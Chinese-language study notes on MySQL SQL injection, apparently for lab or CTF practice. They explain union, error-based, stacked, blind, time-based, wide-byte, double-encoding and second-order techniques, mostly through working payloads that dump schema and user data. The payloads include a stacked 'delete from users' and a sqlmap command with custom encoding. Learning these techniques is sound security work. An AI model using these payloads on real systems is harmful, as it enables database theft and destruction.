sql注入：

文中只举例mysql数据库。

1.原理：

客户端数据未经过转义或处理直接带入数据库，造成了sql注入。

2.常规模板：

（1）判断注入点

字符型：’a’,”a”,(a),(‘a’),(“a”),((“a”)),((‘a’))等。

数字型：1

判断：

一、id=x 加上注释符– （这里是空格，但是在url后要用+），-+，/**/,#(表单常用)

二、id=1’&&’1’=’1

id=1’ and ‘1’=’1

这样构造一个闭合类型。

（2）获取字段数

order by

通过页面变化来查看确定字段数

（3）一般用联合查询查看显示位

查看当前数据库

id=0 union select database(),2,3–+

爆表：

id=0 union selelct 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+

爆列：

0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xxx’–+(有时候爆破没有回显还要用十六进制试一下)

爆字段：

0 union select 1,2,group_concat(id,’~’,user) from (表名)–+

3.类型：

（1）参数：字符型，数字型

（2）提交方式：post，get，cookie，X-Forward-For,User-Agent请求头

（3）注入方式与应用场景：

联合注入

如以上所示，但是要注意的是可能出现一些waf（正则或转义或过滤）阻止我们使用union，这时候我们就根据不同的可能性选择不同方法。这种时候绝大多数是找到一种其他的方法来注入。

报错注入

这种题目特征是只有判断出内容真假的回显，没有回显打印内容，报错出内容

具体的函数作用内容在lesson1-10，我就不赘述了。

然后我们看一下padload：

updatexml或extractvalue

爆表

0 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))–+

爆列

0 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from imformation_schema.columns where table_name=’xxx’)))–+

爆字段

0 and extractvalue(1,concat(0x7e,(select group_concat(xx,0x7e,xx) from table)))–+

但是问题是这些函数只能查询32位，所以我们要用substr()或mid(xxx,33,32)从33位开始截取。

多语句注入（堆叠注入）

原因：没有经过严格过滤mysqli_multi_query函数，可以执行多条SQL语句。mysql_real_escape_string()转义过滤。

用;隔开每一个输入语句，有存在局限的就是它其实如果权限不足会导致无法修改数据。

如:

id=1”;WAITFOR DELAY ‘0:0:3’;delete from users; –+id=1’;select if(length(user(),1,1)>1,sleep(3),1) %23’;select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>1,sleep(3),1) %23

内联注入

这是一种waf的绕过姿势。

id=-1 /!UNION/ /!SELECT/ 1,2,3

会执行/!/里面的内容。

二次编码注入

代码中有urldecode() 函数

%2527 先解码成%27再解码成’单引号

sqlmap -u http://192.168.100.141/index.php/author=123 –prefix “%2527” –suffix “%23”
-prefix为设置前缀 -suffix为设置后缀

设置后缀，防止sqlmap使用内联注

布尔注入

报错注入的情况也适用于布尔盲注（只有判断出内容真假的回显，没有回显打印内容），了解一下基本过程然后直接上脚本爆破。

利用substr()来使用截取判断，还可以用ascii()将其转换成数字，然后就可以用二分法。脚本只是模板，具体情况要根据题目的waf等来判断实现。

延时注入

适用于与bool一样（只有判断出内容真假的回显，没有回显打印内容）

利用if()和sleep()函数来实现

Sleep() :延迟函数

If(condition,true,false) :条件语句

宽字节注入

原理是先编码后转义，GBK 占用两字节

ASCII占用一字节

PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。

大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

如列数测试：

id=%df%27 union select 1,2%23

预防：使用mysql_set_charset(GBK)指定字符集

使用myql_real_escape_string()进行转义，他会考虑当前字符集设置

二次转义注入

后端（PHP）代码对语句进行了转义

保存进数据库（mysql）时没有转义，是原语句

‘#被转义成了其他的东西，所以一次注入无效。
但是在保存进数据库的时候，还是admin ‘#。

那么修改密码时的语句如下：

update users set password=’123’ where username=’admin ‘#’
所以你以为修改的是admin ‘#的账号，但是数据库理解成要修改密码的账号是admin。
